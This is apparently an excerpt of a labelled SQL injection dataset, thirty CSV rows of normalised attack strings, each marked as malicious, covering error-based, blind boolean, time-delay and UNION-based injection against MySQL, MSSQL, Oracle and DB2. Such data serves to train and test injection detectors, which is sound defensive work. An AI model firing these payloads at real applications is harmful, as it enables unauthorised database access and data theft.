row_index,payload_norm,label,sqli_type_hint
6990,"1' ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( 'vedm' = 'vedm",1,
6991,1' rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and 'hyun' like 'hyun,1,
6992,select ( case when ( 4393 = 2875 ) then 1 else 4393* ( select 4393 from master..sysdatabases ) end ) --,1,
6993,"-1915%"" ) ) union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#",1,
6994,"1' ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( 'qbdm' = 'qbdm",1,
6995,1'+ ( select byor where 4538 = 4538,1,
6996,"-3059 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",1,
6997,1' or sleep ( 5 ),1,
6998,select ( case when ( 8113 = 8981 ) then 8113 else 1/ ( select 0 ) end ) --,1,
6999,1%' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( '%' = ',1,
7000,"1'|| ( select 'wvio' from dual where 8934 = 8934 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
7001,"1' ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",1,
7002,"1' ) where 7279 = 7279 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
7003,"1"" ) where 2016 = 2016 and ( 1547 = 2093 ) *2093--",1,
7004,( 8362 = 9139 ) *9139,1,
7005,-6567' ) ) union all select 3217#,1,
7006,"1' procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,
7007,"1' or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and 'ebuo' = 'ebuo",1,
7008,"1%"" ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""%"" = """,1,
7009,"1%"" ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ""%"" = """,1,
7010,1'|| ( select 'nwve' where 7721 = 7721,1,
7011,"1"" ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""rkfk"" like ""rkfk",1,
7012,end# thjv,1,
7013,"1' ) union all select null,null,null,null,null,null,null,null,null#",1,
7014,"1%' ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( '%' = '",1,
7015,"1' ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 'plfa' = 'plfa",1,
7016,-5258 ) or ( 8459 = 8459 ) *4906,1,
7017,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and 'rfgj' like 'rfgj",1,
7018,"-2876"" ) or make_set ( 5306 = 6127,6127 ) and ( ""urjm"" = ""urjm",1,
7019,"-7258"" ) as wjjr where 2110 = 2110 union all select 2110,2110,2110,2110,2110,2110,2110,2110,2110--",1,
